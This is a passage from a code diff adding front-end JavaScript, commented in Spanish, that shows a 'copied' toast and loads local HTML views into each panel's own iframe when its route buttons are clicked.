+    toast.innerText = "✅ Copiado";
+    toast.style.position = "fixed";
+    toast.style.bottom = "20px";
+    toast.style.right = "20px";
+    toast.style.padding = "10px 15px";
+    toast.style.background = "#2e85ccff";
+    toast.style.color = "white";
+    toast.style.borderRadius = "8px";
+    toast.style.fontWeight = "bold";
+    toast.style.zIndex = "9999";
+    document.body.appendChild(toast);
+    setTimeout(() => toast.remove(), 2000);
+  }).catch(() => alert("❌ No se pudo copiar."));
+};
+
+
+
+
+(() => {
+  // Rutas que ya tienes en tu proyecto (ajústalas si tus nombres son distintos)
+  const ROUTES = {
+    inicio: "index.html",
+    gmail: "gmail",           // si es una vista interna tipo /gmail (SPA)
+    gmailHtml: "gmail.html",  // si es archivo html real
+    sep2: "sep2.html",
+    sep3: "sep3.html"
+    // agrega más si lo necesitas…
+  };
+
+  // Inicializa todas las nubes del panel
+  const nubes = Array.from(document.querySelectorAll('.nube'));
+  nubes.forEach((root, i) => {
+    // ID único por nube para namespacing (estado, storage, etc.)
+    if (!root.dataset.nubeId) {
+      root.dataset.nubeId = `nube-${i+1}`;
+    }
+
+    // Encuentra el iframe de ESTA nube (donde cargaremos las vistas)
+    const frame = root.querySelector('.nube-frame');
+    if (!frame) {
+      console.warn(`[${root.dataset.nubeId}] Falta <iframe class="nube-frame"> dentro de esta nube.`);
+      return;
+    }
+
+    // Delegación: cualquier click con data-route dentro de ESTA nube
+    root.addEventListener('click', (ev) => {
+      const btn = ev.target.closest('[data-route]');
+      if (!btn || !root.contains(btn)) return;
+
+      ev.preventDefault();
+
+      const routeKey = btn.dataset.route;
+      let url = ROUTES[routeKey];
+
+      if (!url) {
+        console.warn(`[${root.dataset.nubeId}] Ruta no definida para:`, routeKey);
+        return;
+      }
+
+      // Si estás usando una SPA para algunas rutas (p.ej. "gmail"),
+      // convierte "gmail" en "gmail.html" o en la ruta real que uses.
+      // Abajo resolvemos simple: si no termina en ".html" lo hacemos html.
+      if (!/\.html?$/i.test(url)) {
+        url = `${url}.html`;
+      }
+
+      // Cambia SOLO el iframe de ESTA nube
+      frame.src = url;
+    });
+
+    // Ejemplo: estados/almacenamiento por-nube (si lo necesitas)
+    // Usa keys con namespace para no pisar otras nubes:
+    // localStorage.setItem(`${root.dataset.nubeId}:ultimaRuta`, frame.src);
+    // frame.addEventListener('load', () => {
+    //   localStorage.setItem(`${root.dataset.nubeId}:ultimaRuta`, frame.contentWindow.location.href);
+    // });
+  });
+
+  // ---------- Adaptador para funciones globales existentes ----------
+  // Si tus botones todavía tienen onclick="gmail()" o similares
+  // y no quieres tocar el HTML, estos adaptadores enrutan por-nube:
+  function withNube(fn) {
+    return function (ev) {
+      // intenta resolver la nube por el objetivo del evento o por el botón mismo
+      const target = ev?.target || window.event?.srcElement;
+      const root = target?.closest?.('.nube') || this?.closest?.('.nube');
+      if (!root) return console.warn('No se pudo resolver la nube origen');
+      const frame = root.querySelector('.nube-frame');
+      if (!frame) return console.warn('No hay .nube-frame en esta nube');
+      return fn(root, frame, ev);
+    }
+  }
+
+  // Ejemplos de “polyfills” para tus funciones globales (ajusta nombres):
+  window.irGmail = withNube((root, frame) => frame.src = 'gmail.html');
+  window.irInicio = withNube((root, frame) => frame.src = 'index.html');
+  window.irSep2   = withNube((root, frame) => frame.src = 'sep2.html');
+  window.irSep3   = withNube((root, frame) => frame.src = 'sep3.html');
+
+  // Ahora, si un botón viejo tiene onclick="irGmail()", sólo afectará su propia nube.
+})();
